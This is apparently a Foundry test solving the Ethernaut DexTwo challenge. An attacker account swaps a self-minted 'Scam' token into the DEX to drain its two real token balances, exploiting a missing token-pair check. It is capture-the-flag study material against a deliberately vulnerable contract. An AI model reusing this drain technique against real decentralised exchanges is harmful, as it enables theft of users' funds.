pragma solidity ^0.8;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../src/DexTwo.sol";

contract TestEverything is Test {
    DexTwo private target;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    DexTwo dex;
    SwappableTokenTwo token1;
    SwappableTokenTwo token2;
    SwappableTokenTwo maliciousToken;
    function setUp() public {

        vm.startBroadcast(owner);
        // Deploy Dex contract
        dex = new DexTwo();

        // Deploy token1 and token2
        token1 = new SwappableTokenTwo(0xb074FABC71F36654F18F1c2712185a390e0839a8, "TOKEN1", "TK1", 1000000);
        token2 = new SwappableTokenTwo(0xb074FABC71F36654F18F1c2712185a390e0839a8, "TOKEN2", "TK2", 1000000);
        maliciousToken = new SwappableTokenTwo(0xb074FABC71F36654F18F1c2712185a390e0839a8, "Scam", "SCAM", 1000000);

        // Set tokens in Dex
        dex.setTokens(address(token1), address(token2));

        // Mint tokens to the owner (assuming the owner is the one who deployed the contract)
        token1.transfer(owner, 100);  // Adjust the amount as needed
        token2.transfer(owner, 100);  // Adjust the amount as needed

        token1.transfer(attacker, 10);  // Adjust the amount as needed
        token2.transfer(attacker, 10);  // Adjust the amount as needed
        maliciousToken.transfer(attacker, 1000);  // Adjust the amount as needed
        maliciousToken.transfer(owner, 1000);  // Adjust the amount as needed

        // Optionally add liquidity
        token1.approve(address(dex), 1000000);
        token2.approve(address(dex), 1000000 );
        maliciousToken.approve(address(dex), 1000000 );
        dex.add_liquidity(address(token1), 100 );
        dex.add_liquidity(address(token2), 100 );
        dex.add_liquidity(address(maliciousToken), 100);

        // Give the owner some native currency (ETH)
        vm.stopBroadcast();
    }

    function testSwapManipulation() public {
        vm.startBroadcast(attacker);
        dex.approve(address(dex), 100000);
        IERC20(maliciousToken).approve(address(dex), 10000);
        uint256 balanceToken1Before = token1.balanceOf(address(dex));
        uint256 balanceToken2Before = token2.balanceOf(address(dex));
        dex.swap(address(maliciousToken), address(token1), 100);
        dex.swap(address(maliciousToken), address(token2), 200);
        
        uint256 balanceToken1After = token1.balanceOf(address(dex));
        uint256 balanceToken2After = token2.balanceOf(address(dex));

        console.log(balanceToken1Before, balanceToken2Before, balanceToken1After, balanceToken2After);
        vm.stopBroadcast();
    }
}